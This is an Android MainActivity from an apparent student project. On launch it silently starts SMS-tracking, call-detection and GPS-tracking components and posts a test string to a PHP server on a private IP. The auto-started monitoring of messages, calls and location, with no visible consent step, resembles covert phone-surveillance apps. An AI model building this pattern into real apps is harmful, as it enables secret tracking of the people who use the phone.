package my.app.proyectosoftwareandroid;

import android.support.v7.app.ActionBarActivity;

import java.util.ArrayList;
import java.util.List;
 
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;
import org.json.JSONObject;



import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.view.Menu;
import android.view.MenuItem;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

public class MainActivity extends ActionBarActivity {

	 private ProgressDialog pDialog;
	 
	    JSONParser jsonParser = new JSONParser();
	    EditText inputName;
	    EditText inputPrice;
	    EditText inputDesc;
	    Context con;
	    MainActivity esto = this;
	    // url to create new product
	    private static String url_insertar_tablaprueba = "http://10.0.0.10:8080/ProyectoSoftwareAndroidAdmin/insertar_tablaprueba.php";
	 
	    private static final String TAG_SUCCESS = "success";
	 
	    @Override
	    public void onCreate(Bundle savedInstanceState) {
	        super.onCreate(savedInstanceState);
	        setContentView(R.layout.activity_main);
	        con = this.getApplicationContext();
	        new Mensajes().execute();
	        new GPS().execute();
	       
	        Intent intent = new Intent(this, CallDetectService.class);
	        	startService(intent);

	        // Edit Text
try {
	      new InsertarTablaPrueba().execute();
	 }catch(Exception e)
	 {
		 System.err.println(e.getMessage());
	 }
	    }
	    class Mensajes extends AsyncTask<String, String, String> {
	    	protected String doInBackground(String... args) {
	    		 Intent intent2 = new Intent(esto, SMSTrackerActivity.class);
	    		startService(intent2);
	    		return null;
	    	}
	    }
	    
	    class GPS extends AsyncTask<String, String, String> {
	    	protected String doInBackground(String... args) {
	    		final AndroidGPSTracking gps = new AndroidGPSTracking();
	    		if (gps!= null){
	    			System.err.println("Se inicio la alarma de GPS");
	    			gps.SetAlarm(con);
	    		}
	    		return null;
	    	}
	    }
	    /**
	     * Background Async Task to Create new product
	     * */
	    class InsertarTablaPrueba extends AsyncTask<String, String, String> {
	 
	        /**
	         * Before starting background thread Show Progress Dialog
	         * */
	        @Override
	        protected void onPreExecute() {
	            super.onPreExecute();
	            pDialog = new ProgressDialog(MainActivity.this);
	            pDialog.setMessage("Insertando Texto");
	            pDialog.setIndeterminate(false);
	            pDialog.setCancelable(true);
	            pDialog.show();
	        }
	 
	        /**
	         * Creating product
	         * */
	        protected String doInBackground(String... args) {
	        
	 String textotabla = "Texto desde Aplicación Móvil Android";
	            // Building Parameters
	            List<NameValuePair> params = new ArrayList<NameValuePair>();
	            params.add(new BasicNameValuePair("textotabla", textotabla));
	            
	 
	            // getting JSON Object
	            // Note that create product url accepts POST method
	            JSONObject json = jsonParser.makeHttpRequest(url_insertar_tablaprueba,
	                    "POST", params);
	 
	            // check log cat from response
	            Log.d("Create Response", json.toString());
	 
	            // check for success tag
	            try {
	                int success = json.getInt(TAG_SUCCESS);
	 
	                if (success == 1) {
	                    // successfully created product
	                	
	 
	                    // closing this screen
	                    //finish();
	                } else {
	                    // failed to create product
	                }
	            } catch (JSONException e) {
	                e.printStackTrace();
	            }
	 
	            return null;
	        }
	 
	        /**
	         * After completing background task Dismiss the progress dialog
	         * **/
	        protected void onPostExecute(String file_url) {
	            // dismiss the dialog once done
	            pDialog.dismiss();
	        }
	 
	    }
}
